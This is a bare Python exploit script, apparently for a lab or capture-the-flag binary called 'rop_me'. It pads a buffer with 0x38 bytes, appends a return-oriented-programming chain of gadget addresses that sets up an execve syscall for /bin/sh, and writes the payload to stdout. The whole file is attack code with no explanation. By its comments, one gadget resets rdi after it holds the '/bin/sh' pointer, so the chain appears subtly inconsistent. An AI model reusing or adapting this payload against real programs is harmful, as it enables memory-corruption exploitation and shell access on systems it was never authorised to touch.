#! /usr/bin/python
import os, struct, sys
rop_chain = [0x40121b,  # pop rax ; ret
             0x3b,      # data - syscall number of execve
             0x401453,  # pop rdi ; ret
             0x402012,  # data - "/bin/sh" pointer from rop_me
             0x401451,  # pop rsi ; pop r15 ; ret
             0x404080,  # data - NULL pointer from rop_me
             0x4013c1,  # xor edi, edi ; mov rdx, rdi ; inc rdi ; ret
             0x4013a2]  # syscall
output = b'A'*0x38# + struct.pack('<Q', 0x7fffffffdee0 + 0x40)
for gadget in rop_chain:
    output += struct.pack('<Q', gadget)
#print(r"".join(["\\x{:02x}".format(b) for b in output]))
os.write(1, output)
